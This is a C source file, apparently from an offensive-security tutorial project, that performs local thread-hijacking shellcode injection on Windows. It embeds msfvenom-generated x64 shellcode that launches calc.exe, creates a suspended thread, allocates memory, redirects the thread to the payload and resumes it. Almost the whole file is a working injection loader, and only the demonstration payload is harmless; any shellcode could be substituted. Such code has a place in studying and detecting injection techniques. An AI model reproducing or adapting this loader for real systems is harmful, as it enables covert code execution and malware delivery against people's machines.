/*
------------------------------------------------------
@culprit: crow
@website: https://www.crow.rip (blog post coming soon)
@credits: in future blog post @ #references
@youtube: https://youtube.com/@crr0ww
------------------------------------------------------
*/

#include "injection.h"

#pragma section(".text")
/* placing our payload in the .text section */
/* msfvenom --platform windows --arch x64 -p windows/x64/exec CMD="cmd.exe /c calc.exe" -f csharp EXITFUNC=thread */
__declspec(allocate(".text")) CONST UCHAR Shellcode[] = {
    0xfc,0x48,0x83,0xe4,0xf0,
    0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,
    0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
    0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,
    0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
    0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,
    0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
    0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,
    0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,
    0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
    0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
    0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,
    0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,
    0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,
    0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,
    0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,
    0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,
    0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,
    0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,
    0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
    0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
    0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,
    0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,
    0x63,0x2e,0x65,0x78,0x65,0x00
};

int main() {

    PrintBanner();

    BOOL   State        = TRUE;
    PVOID  Buffer       = NULL;
	HANDLE ThreadHandle = NULL;

    INFO("creating a suspended thread in the local process...");
	ThreadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
	if (NULL == ThreadHandle) {
		PRINT_ERROR("CreateThread");
		return EXIT_FAILURE; /* no point in continuing if we can't even get a handle on the thread */
	}
	OKAY("[0x%p] created the thread (%ld)! beginning the hijack...", ThreadHandle, GetThreadId(ThreadHandle));

    Buffer = VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NULL == Buffer) {
        PRINT_ERROR("VirtualAlloc");
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a buffer in memory with PAGE_READWRITE [RW-] permissions!", Buffer);

	if (!LocalThreadHijack(ThreadHandle, Buffer, Shellcode, sizeof(Shellcode))) {
		WARN("thread hijack failed, exiting...");
        State = FALSE; goto CLEANUP;
	}
	OKAY("[0x%p] hijack was successful! resuming thread...", ThreadHandle);

	ResumeThread(ThreadHandle);
    INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
    WaitForSingleObject(ThreadHandle, INFINITE);
    INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);

CLEANUP:

    if (Buffer){
        VirtualFree(Buffer, 0, MEM_RELEASE);
        INFO("[0x%p] allocated buffer freed", Buffer);
    }

    if (ThreadHandle) {
        CloseHandle(ThreadHandle);
        INFO("[0x%p] closed thread handle", ThreadHandle);
    }

    return State;

}
